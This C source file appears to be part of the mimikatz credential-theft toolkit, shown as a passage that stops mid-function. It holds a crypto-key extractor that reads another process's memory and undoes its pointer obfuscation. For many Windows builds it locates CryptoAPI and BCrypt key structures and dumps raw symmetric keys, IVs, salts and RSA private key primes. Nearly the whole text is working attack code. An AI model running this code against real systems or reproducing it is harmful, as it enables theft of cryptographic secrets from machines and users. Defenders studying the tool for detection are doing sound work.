/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_crypto_extractor.h"

void kuhl_m_crypto_extractor_capi32(PKULL_M_MEMORY_ADDRESS address)
{
	KIWI_CRYPTKEY32 kKey;
	KIWI_UNK_INT_KEY32 kUnk;
	KIWI_RAWKEY32 kRaw;
	PKIWI_RAWKEY_51_32 pXp = (PKIWI_RAWKEY_51_32) &kRaw;
	KIWI_PRIV_STRUCT_32 kStruct;
	DWORD64 pRsa;
	RSAPUBKEY rsaPub; // dirty, dirty, dirty
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&kKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	DWORD i;
	BYTE k;
	if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_CRYPTKEY32)))
	{
		if(address->address = ULongToPtr(kKey.obfKiwiIntKey ^ RSAENH_KEY_32))
		{
			aLocalBuffer.address = &kUnk;
			if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_UNK_INT_KEY32)))
			{
				if(kUnk.unk0 > 1 && kUnk.unk0 < 5)
				{
					if(address->address = ULongToPtr(kUnk.KiwiRawKey))
					{
						aLocalBuffer.address = &kRaw;
						if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_RAWKEY32)))
						{
							if(kRaw.Algid && (kRaw.Algid <= 0xffff) && kRaw.dwData <= 0x8000)
							{
								kprintf(L"\nAlgid     : %s (0x%x)\n", kull_m_crypto_algid_to_name(kRaw.Algid), kRaw.Algid);
								kprintf(L"Key (%3u) : ", kRaw.dwData);
								if(address->address = ULongToPtr(kRaw.Data))
								{
									if(aLocalBuffer.address = LocalAlloc(LPTR, kRaw.dwData))
									{
										if(kull_m_memory_copy(&aLocalBuffer, address,  kRaw.dwData))
											kull_m_string_wprintf_hex(aLocalBuffer.address, kRaw.dwData, 0);
										else PRINT_ERROR(L"Unable to read from @ %p", address->address);
										LocalFree(aLocalBuffer.address);
									}
								}
								kprintf(L"\n");

								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) // damn XP...
								{
									if(GET_ALG_TYPE(pXp->Algid) == ALG_TYPE_BLOCK)
									{
										kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_kp_mode_to_str(pXp->dwMode), pXp->dwMode);
										for(i = 0, k = 0; !k && (i < pXp->dwBlockLen); k |= pXp->IV[i++]);
										if(k)
										{
											kprintf(L"IV        : ");
											kull_m_string_wprintf_hex(pXp->IV, pXp->dwBlockLen, 0);
											kprintf(L"\n");
										}
									}
									if(pXp->dwSalt)
									{
										kprintf(L"Salt      : ");
										kull_m_string_wprintf_hex(pXp->Salt, pXp->dwSalt, 0);
										kprintf(L"\n");
									}
								}
								else
								{
									if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_BLOCK)
									{
										kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_kp_mode_to_str(kRaw.dwMode), kRaw.dwMode);
										for(i = 0, k = 0; !k && (i < kRaw.dwBlockLen); k |= kRaw.IV[i++]);
										if(k)
										{
											kprintf(L"IV        : ");
											kull_m_string_wprintf_hex(kRaw.IV, kRaw.dwBlockLen, 0);
											kprintf(L"\n");
										}
									}
									if(kRaw.dwSalt)
									{
										kprintf(L"Salt      : ");
										kull_m_string_wprintf_hex(kRaw.Salt, kRaw.dwSalt, 0);
										kprintf(L"\n");
									}
								}
							}

							if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_RSA)
							{
								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7)
									i = 308;
								else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
									i = 300;
								else 
									i = 356;

								if(address->address = ULongToPtr(kRaw.obfUnk0 ^ RSAENH_KEY_32))
								{
									aLocalBuffer.address = &kStruct;
									if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_PRIV_STRUCT_32)))
									{
										if(kStruct.strangeStruct)
										{
											aLocalBuffer.address = &pRsa;
											address->address = ULongToPtr(kStruct.strangeStruct + i);
											if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(DWORD64)))
											{
												if(address->address = (PVOID) pRsa)
												{
													aLocalBuffer.address = &rsaPub;
													if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(RSAPUBKEY))) /// pubexp 4 bitlen
													{
														i = kuhl_m_crypto_extractor_GetKeySizeForEncryptMemory(kuhl_m_crypto_extractor_GetKeySize(rsaPub.pubexp));
														if(aLocalBuffer.address = LocalAlloc(LPTR, i))
														{
															if(kull_m_memory_copy(&aLocalBuffer, address, i))
															{
																kprintf(L"PrivKey   : ");
																kull_m_string_wprintf_hex(aLocalBuffer.address, i, 0);
																kprintf(L"\n!!! parts after public exponent are process encrypted !!!\n");
															}
															LocalFree(aLocalBuffer.address);
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}
#ifdef _M_X64

void kuhl_m_crypto_extractor_capi64(PKULL_M_MEMORY_ADDRESS address)
{
	KIWI_CRYPTKEY64 kKey;
	KIWI_UNK_INT_KEY64 kUnk;
	KIWI_RAWKEY64 kRaw;
	KIWI_PRIV_STRUCT_64 kStruct;
	DWORD64 pRsa;
	RSAPUBKEY rsaPub; // dirty, dirty, dirty
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&kKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	DWORD i;
	BYTE k;
	if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_CRYPTKEY64)))
	{
		if(address->address = (PVOID) (kKey.obfKiwiIntKey ^ RSAENH_KEY_64))
		{
			aLocalBuffer.address = &kUnk;
			if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_UNK_INT_KEY64)))
			{
				if(kUnk.unk0 > 1 && kUnk.unk0 < 5)
				{
					if(address->address = (PVOID) kUnk.KiwiRawKey)
					{
						aLocalBuffer.address = &kRaw;
						if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_RAWKEY64)))
						{
							if(kRaw.Algid && (kRaw.Algid <= 0xffff) && kRaw.dwData <= 0x8000)
							{
								kprintf(L"\nAlgid     : %s (0x%x)\n", kull_m_crypto_algid_to_name(kRaw.Algid), kRaw.Algid);
								kprintf(L"Key (%3u) : ", kRaw.dwData);
								if(address->address = (PVOID) kRaw.Data)
								{
									if(aLocalBuffer.address = LocalAlloc(LPTR, kRaw.dwData))
									{
										if(kull_m_memory_copy(&aLocalBuffer, address,  kRaw.dwData))
											kull_m_string_wprintf_hex(aLocalBuffer.address, kRaw.dwData, 0);
										else PRINT_ERROR(L"Unable to read from @ %p", address->address);
										LocalFree(aLocalBuffer.address);
									}
								}
								kprintf(L"\n");
								if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_BLOCK)
								{
									kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_kp_mode_to_str(kRaw.dwMode), kRaw.dwMode);
									for(i = 0, k = 0; !k && (i < kRaw.dwBlockLen); k |= kRaw.IV[i++]);
									if(k)
									{
										kprintf(L"IV        : ");
										kull_m_string_wprintf_hex(kRaw.IV, kRaw.dwBlockLen, 0);
										kprintf(L"\n");
									}
								}
								if(kRaw.dwSalt)
								{
									kprintf(L"Salt      : ");
									kull_m_string_wprintf_hex(kRaw.Salt, kRaw.dwSalt, 0);
									kprintf(L"\n");
								}

								if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_RSA)
								{
									if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7)
										i = 384;
									else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
										i = 368;
									else 
										i = 432;

									if(address->address = (PVOID) (kRaw.obfUnk0 ^ RSAENH_KEY_64))
									{
										aLocalBuffer.address = &kStruct;
										if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_PRIV_STRUCT_64)))
										{
											if(kStruct.strangeStruct)
											{
												aLocalBuffer.address = &pRsa;
												address->address = (PVOID) (kStruct.strangeStruct + i);
												if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(DWORD64)))
												{
													if(address->address = (PVOID) pRsa)
													{
														aLocalBuffer.address = &rsaPub;
														if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(RSAPUBKEY))) /// pubexp 4 bitlen
														{
															i = kuhl_m_crypto_extractor_GetKeySizeForEncryptMemory(kuhl_m_crypto_extractor_GetKeySize(rsaPub.pubexp));
															if(aLocalBuffer.address = LocalAlloc(LPTR, i))
															{
																if(kull_m_memory_copy(&aLocalBuffer, address, i))
																{
																	kprintf(L"PrivKey   : ");
																	kull_m_string_wprintf_hex(aLocalBuffer.address, i, 0);
																	kprintf(L"\n!!! parts after public exponent are process encrypted !!!\n");
																}
																LocalFree(aLocalBuffer.address);
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}
#endif

void kuhl_m_crypto_extractor_bcrypt32_bn(PKIWI_BCRYPT_BIGNUM_Header bn)
{
	if(bn->tag)
	{
		switch(((bn->tag) >> 16) & 0xff)
		{
		case 'I':
			kull_m_string_wprintf_hex(((PKIWI_BCRYPT_BIGNUM_Int32) bn)->data, bn->size - FIELD_OFFSET(KIWI_BCRYPT_BIGNUM_Int32, data), 0);
			break;
		case 'D':
			kuhl_m_crypto_extractor_bcrypt32_bn(&((PKIWI_BCRYPT_BIGNUM_Div) bn)->bn);
			break;
		case 'M':
			kuhl_m_crypto_extractor_bcrypt32_bn(&((PKIWI_BCRYPT_BIGNUM_ComplexType32) bn)->bn);
			break;
		default:
			PRINT_ERROR(L"Unknown tag: %08x\n", bn->tag);
		}
	}
}

void kuhl_m_crypto_extractor_bcrypt32_bn_ex(PVOID curBase, DWORD32 remBase, DWORD32 remAddr, LPCWSTR num)
{
	PKIWI_BCRYPT_BIGNUM_Header bn;
	if(remAddr)
	{
		bn = (PKIWI_BCRYPT_BIGNUM_Header) ((PBYTE) curBase + (remAddr - remBase));
		if(bn->tag)
		{
			kprintf(L"%s: ", num);
			kuhl_m_crypto_extractor_bcrypt32_bn(bn);
			kprintf(L"\n");
		}
	}
}

void kuhl_m_crypto_extractor_bcrypt32_classic(PKULL_M_MEMORY_HANDLE hMemory, DWORD32 addr, DWORD size, LPCWSTR num)
{
	KULL_M_MEMORY_ADDRESS address = {ULongToPtr(addr), hMemory}, aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(addr && size)
	{
		kprintf(L"%s: ", num);
		if(aLocalBuffer.address = LocalAlloc(LPTR, size))
		{
			if(kull_m_memory_copy(&aLocalBuffer, &address, size))
				kull_m_string_wprintf_hex(aLocalBuffer.address, size, 0);
			LocalFree(aLocalBuffer.address);
		}
		kprintf(L"\n");
	}
}

void kuhl_m_crypto_extractor_bcrypt32(PKULL_M_MEMORY_ADDRESS address)
{
	KIWI_BCRYPT_HANDLE_KEY32 hKey;
	DWORD aSymSize;
	PKIWI_BCRYPT_ASYM_KEY_DATA_10_32 pa;
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header, *p;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&hKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	WORD alg, i;
	BYTE k;

	if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_BCRYPT_HANDLE_KEY32)))
	{
		if(address->address = ULongToPtr(hKey.key))
		{
			aLocalBuffer.address = &Header;
			if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_BCRYPT_GENERIC_KEY_HEADER)))
			{
				if(p = (PKIWI_BCRYPT_GENERIC_KEY_HEADER) LocalAlloc(LPTR, Header.size))
				{
					aLocalBuffer.address = p;
					if(kull_m_memory_copy(&aLocalBuffer, address, Header.size))
					{
						alg = Header.type & 0xffff;
						kprintf(L"\nAlgId     : ");
						switch(Header.type >> 16)
						{
						case BCRYPT_CIPHER_INTERFACE:
							kprintf(L"%s (0x%x)\n", kull_m_crypto_bcrypt_cipher_alg_to_str(alg), Header.type);
							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
							{
								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwMode);
								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwBlockLen); k |= *((PBYTE) p + Header.size + i++ - ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwBlockLen));
								if(k)
								{
									kprintf(L"IV        : ");
									kull_m_string_wprintf_hex((PBYTE) p + Header.size - ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwBlockLen, ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwBlockLen, 0);
									kprintf(L"\n");
								}
								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwData);
								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_6_32) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_6_32) p)->dwData, 0);
							}
							else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
							{
								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwMode);
								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwBlockLen); k |= ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->IV[i++]);
								if(k)
								{
									kprintf(L"IV        : ");
									kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_80_32) p)->IV, ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwBlockLen, 0);
									kprintf(L"\n");
								}
								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwData);
								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_80_32) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_80_32) p)->dwData, 0);
							}
							else
							{
								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_81_32) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_81_32) p)->dwMode);
								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_81_32) p)->dwBlockLen); k |= ((PKIWI_BCRYPT_SYM_KEY_81_32) p)->IV[i++]);
								if(k)
								{
									kprintf(L"IV        : ");
									kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_81_32) p)->IV, ((PKIWI_BCRYPT_SYM_KEY_81_32) p)->dwBlockLen, 0);
									kprintf(L"\n");
								}
								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_81_32) p)->dwData);
								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_81_32) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_81_32) p)->dwData, 0);
							}
							kprintf(L"\n");
							break;
						case BCRYPT_ASYMMETRIC_ENCRYPTION_INTERFACE:
							kprintf(L"%s (0x%x)\n", kull_m_crypto_bcrypt_asym_alg_to_str(alg), Header.type);
							switch(Header.tag)
							{
							case 'MSRK':
								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
								{
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->PublicExponent, 1 * 4, L"PubExp    ");
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->nbModulus * 4, L"Modulus   ");
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime1.Prime, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime1.nbBlock * 4, L"Prime1    ");
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime2.Prime, ((PKIWI_BCRYPT_ASYM_KEY_6_32) p)->bnPrime2.nbBlock * 4, L"Prime2    ");
								}
								else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1703)
								{
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->PublicExponent, 1 * 4, L"PubExp    ");
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->nbModulus * 4, L"Modulus   ");
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->bnPrime1.Prime, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->bnPrime1.nbBlock * 4, L"Prime1    ");
									kuhl_m_crypto_extractor_bcrypt32_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->bnPrime2.Prime, ((PKIWI_BCRYPT_ASYM_KEY_81_32) p)->bnPrime2.nbBlock * 4, L"Prime2    ");
								}
								else
								{
									if(address->address = ULongToPtr(((PKIWI_BCRYPT_ASYM_KEY_10_32) p)->data))
									{
										aLocalBuffer.address = &aSymSize;
										if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(aSymSize)))
										{
											if(pa = (PKIWI_BCRYPT_ASYM_KEY_DATA_10_32) LocalAlloc(LPTR, aSymSize))
											{
												aLocalBuffer.address = pa;
												if(kull_m_memory_copy(&aLocalBuffer, address, aSymSize))
												{
													kuhl_m_crypto_extractor_bcrypt32_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_32) p)->data, pa->PublicExponent,	L"PubExp    ");
													kuhl_m_crypto_extractor_bcrypt32_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_32) p)->data, pa->Modulus,		L"Modulus   ");
													kuhl_m_crypto_extractor_bcrypt32_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_32) p)->data, pa->Prime1,			L"Prime1    ");
													kuhl_m_crypto_extractor_bcrypt32_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_32) p)->data, pa->Prime2,			L"Prime2    ");
												}
												LocalFree(pa);
											}
										}
									}
								}
								break;
							case 'MSKY':
								// TODO
								break;
							default:
								PRINT_ERROR(L"Tag %.4S not supported\n", &Header.tag);
							}
							break;
						default:
							PRINT_ERROR(L"Unsupported interface,alg (0x%x)\n", Header.type);
						}
					}
					LocalFree(p);
				}
			}
		}
	}
}

#ifdef _M_X64
void kuhl_m_crypto_extractor_bcrypt64_bn(PKIWI_BCRYPT_BIGNUM_Header bn)
{
	if(bn->tag)
	{
		switch(((bn->tag) >> 16) & 0xff)
		{
		case 'I':
			kull_m_string_wprintf_hex(((PKIWI_BCRYPT_BIGNUM_Int64) bn)->data, bn->size - FIELD_OFFSET(KIWI_BCRYPT_BIGNUM_Int64, data), 0);
			break;
		case 'D':
			kuhl_m_crypto_extractor_bcrypt64_bn(&((PKIWI_BCRYPT_BIGNUM_Div) bn)->bn);
			break;
		case 'M':
			kuhl_m_crypto_extractor_bcrypt64_bn(&((PKIWI_BCRYPT_BIGNUM_ComplexType64) bn)->bn);
			break;
		default:
			PRINT_ERROR(L"Unknown tag: %08x\n", bn->tag);
		}
	}
}

void kuhl_m_crypto_extractor_bcrypt64_bn_ex(PVOID curBase, DWORD64 remBase, DWORD64 remAddr, LPCWSTR num)
{
	PKIWI_BCRYPT_BIGNUM_Header bn;
	if(remAddr)
	{
		bn = (PKIWI_BCRYPT_BIGNUM_Header) ((PBYTE) curBase + (remAddr - remBase));
		if(bn->tag)
		{
			kprintf(L"%s: ", num);
			kuhl_m_crypto_extractor_bcrypt64_bn(bn);
			kprintf(L"\n");
		}
	}
}

void kuhl_m_crypto_extractor_bcrypt64_classic(PKULL_M_MEMORY_HANDLE hMemory, DWORD64 addr, DWORD size, LPCWSTR num)
{
	KULL_M_MEMORY_ADDRESS address = {(LPVOID) addr, hMemory}, aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(addr && size)
	{
		kprintf(L"%s: ", num);
		if(aLocalBuffer.address = LocalAlloc(LPTR, size))
		{
			if(kull_m_memory_copy(&aLocalBuffer, &address, size))
				kull_m_string_wprintf_hex(aLocalBuffer.address, size, 0);
			LocalFree(aLocalBuffer.address);
		}
		kprintf(L"\n");
	}
}

void kuhl_m_crypto_extractor_bcrypt64(PKULL_M_MEMORY_ADDRESS address)
{
	KIWI_BCRYPT_HANDLE_KEY64 hKey;
	DWORD aSymSize;
	PKIWI_BCRYPT_ASYM_KEY_DATA_10_64 pa;
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header, *p;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&hKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	WORD alg, i;
	BYTE k;

	if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_BCRYPT_HANDLE_KEY64)))
	{
		if(address->address = (PVOID) hKey.key)
		{
			aLocalBuffer.address = &Header;
			if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_BCRYPT_GENERIC_KEY_HEADER)))
			{
				if(p = (PKIWI_BCRYPT_GENERIC_KEY_HEADER) LocalAlloc(LPTR, Header.size))
				{
					aLocalBuffer.address = p;
					if(kull_m_memory_copy(&aLocalBuffer, address, Header.size))
					{
						alg = Header.type & 0xffff;
						kprintf(L"\nAlgId     : ");
						switch(Header.type >> 16)
						{
						case BCRYPT_CIPHER_INTERFACE:
							kprintf(L"%s (0x%x)\n", kull_m_crypto_bcrypt_cipher_alg_to_str(alg), Header.type);
							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
							{
								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwMode);
								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwBlockLen); k |= *((PBYTE) p + Header.size + i++ - ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwBlockLen));
								if(k)
								{
									kprintf(L"IV        : ");
									kull_m_string_wprintf_hex((PBYTE) p + Header.size - ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwBlockLen, ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwBlockLen, 0);
									kprintf(L"\n");
								}
								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwData);
								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_6_64) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_6_64) p)->dwData, 0);
							}
							else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
							{
								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwMode);
								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwBlockLen); k |= ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->IV[i++]);
								if(k)
								{
									kprintf(L"IV        : ");
									kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_80_64) p)->IV, ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwBlockLen, 0);
									kprintf(L"\n");
								}
								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwData);
								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_80_64) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_80_64) p)->dwData, 0);
							}
							else
							{
								kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_bcrypt_mode_to_str(((PKIWI_BCRYPT_SYM_KEY_81_64) p)->dwMode), ((PKIWI_BCRYPT_SYM_KEY_81_64) p)->dwMode);
								for(i = 0, k = 0; !k && (i < ((PKIWI_BCRYPT_SYM_KEY_81_64) p)->dwBlockLen); k |= ((PKIWI_BCRYPT_SYM_KEY_81_64) p)->IV[i++]);
								if(k)
								{
									kprintf(L"IV        : ");
									kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_81_64) p)->IV, ((PKIWI_BCRYPT_SYM_KEY_81_64) p)->dwBlockLen, 0);
									kprintf(L"\n");
								}
								kprintf(L"Key (%3u) : ", ((PKIWI_BCRYPT_SYM_KEY_81_64) p)->dwData);
								kull_m_string_wprintf_hex(((PKIWI_BCRYPT_SYM_KEY_81_64) p)->Data, ((PKIWI_BCRYPT_SYM_KEY_81_64) p)->dwData, 0);
							}
							kprintf(L"\n");
							break;
						case BCRYPT_ASYMMETRIC_ENCRYPTION_INTERFACE:
							kprintf(L"%s (0x%x)\n", kull_m_crypto_bcrypt_asym_alg_to_str(alg), Header.type);
							switch(Header.tag)
							{
							case 'MSRK':
								if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
								{
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->PublicExponent, 1 * 8, L"PubExp    ");
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->nbModulus * 8, L"Modulus   ");
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime1.Prime, (DWORD) ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime1.nbBlock * 8, L"Prime1    ");
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime2.Prime, (DWORD) ((PKIWI_BCRYPT_ASYM_KEY_6_64) p)->bnPrime2.nbBlock * 8, L"Prime2    ");
								}
								else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1703)
								{
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->PublicExponent, 1 * 8, L"PubExp    ");
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->Modulus, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->nbModulus * 8, L"Modulus   ");
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->bnPrime1.Prime, (DWORD) ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->bnPrime1.nbBlock * 8, L"Prime1    ");
									kuhl_m_crypto_extractor_bcrypt64_classic(address->hMemory, ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->bnPrime2.Prime, (DWORD) ((PKIWI_BCRYPT_ASYM_KEY_81_64) p)->bnPrime2.nbBlock * 8, L"Prime2    ");
								}
								else
								{
									if(address->address = (PVOID) ((PKIWI_BCRYPT_ASYM_KEY_10_64) p)->data)
									{
										aLocalBuffer.address = &aSymSize;
										if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(aSymSize)))
										{
											if(pa = (PKIWI_BCRYPT_ASYM_KEY_DATA_10_64) LocalAlloc(LPTR, aSymSize))
											{
												aLocalBuffer.address = pa;
												if(kull_m_memory_copy(&aLocalBuffer, address, aSymSize))
												{
													kuhl_m_crypto_extractor_bcrypt64_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_64) p)->data, pa->PublicExponent,	L"PubExp    ");
													kuhl_m_crypto_extractor_bcrypt64_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_64) p)->data, pa->Modulus,		L"Modulus   ");
													kuhl_m_crypto_extractor_bcrypt64_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_64) p)->data, pa->Prime1,			L"Prime1    ");
													kuhl_m_crypto_extractor_bcrypt64_bn_ex(pa, ((PKIWI_BCRYPT_ASYM_KEY_10_64) p)->data, pa->Prime2,			L"Prime2    ");
												}
												LocalFree(pa);
											}
										}
									}
								}
								break;
							case 'MSKY':
								// TODO
								break;
							default:
								PRINT_ERROR(L"Tag %.4S not supported\n", &Header.tag);
							}
							break;
						default:
							PRINT_ERROR(L"Unsupported interface,alg (0x%x)\n", Header.type);
						}
					}
					LocalFree(p);
				}
			}
		}
	}
}
#endif

DWORD kuhl_m_crypto_extractor_GetKeySizeForEncryptMemory(DWORD size)
{
  DWORD v1;
  v1 = size - 20;
  if (((BYTE) size - 20) & 0xf)
    v1 += 16 - (((BYTE) size - 20) & 0xf);
  return v1 + 20;
}

DWORD kuhl_m_crypto_extractor_GetKeySize(DWORD bits)
{
